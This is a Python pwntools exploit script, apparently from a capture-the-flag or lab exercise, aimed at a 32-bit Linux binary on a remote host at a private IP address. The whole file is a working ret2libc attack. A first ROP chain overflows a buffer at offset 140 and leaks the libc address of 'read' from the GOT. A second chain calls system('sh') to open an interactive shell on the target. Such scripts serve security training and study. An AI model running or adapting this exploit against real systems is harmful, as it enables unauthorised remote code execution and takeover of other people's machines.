#!/usr/bin/env python
# coding=utf-8

import os
from pwn import *


context.clear()
context.update(arch='i386', os='linux', endian='little', word_size=32)
context.log_level = 'debug'
log.info(vars(context))


#cyslic offset
cyclic_offset = 140


#exploit the process
# file 'a.out' is the target(you should copy this file from remote to local)
elf = ELF('./a.out')
# file 'libcso6' is the libc which used by target(you should copy this file from remote to local).
libc = ELF('./libcso6')
# remote address
io = remote('192.168.33.127', 8888)


#------------------------------------------------------------------
# stage 1
# get function 'read' real address in libc

log.debug(io.recvline()) # function 'read' real address in libc(this is for debug)
log.debug(io.recvline()) # Hello, World

# Create a ROP stack to dump the GOT and return to main()
# so we can exploit again.
rop = ROP(elf)
rop.write(1, elf.got['read'], 4) # write function 'read' real address to stdout(1)
rop.main() # call function main() again so we can execute other code again

log.debug(rop.dump())

# send ROP code to target process
io.send(fit({
    cyclic_offset: str(rop)
    }))

# Get the address of 'read' from network
read = io.unpack()
log.info('read = ' + hex(read))


#------------------------------------------------------------------
# stage 1
# calculate function 'system' address

log.debug(io.recvline()) # function 'read' real address in libc(this is for debug)
log.debug(io.recvline()) # Hello, World

# Adjust libc against that offset
libc.address = read - libc.symbols['read']

# Get the address of system(), and build our new ROP stack.
system = libc.symbols['system']
binsh = libc.search('sh\x00').next()
log.info('system = ' + hex(system))
log.info('binsh = ' + hex(binsh))

rop = ROP(libc)
rop.system(binsh)
rop.exit(0)

io.send(fit({
    cyclic_offset: str(rop)
    }))


io.interactive()

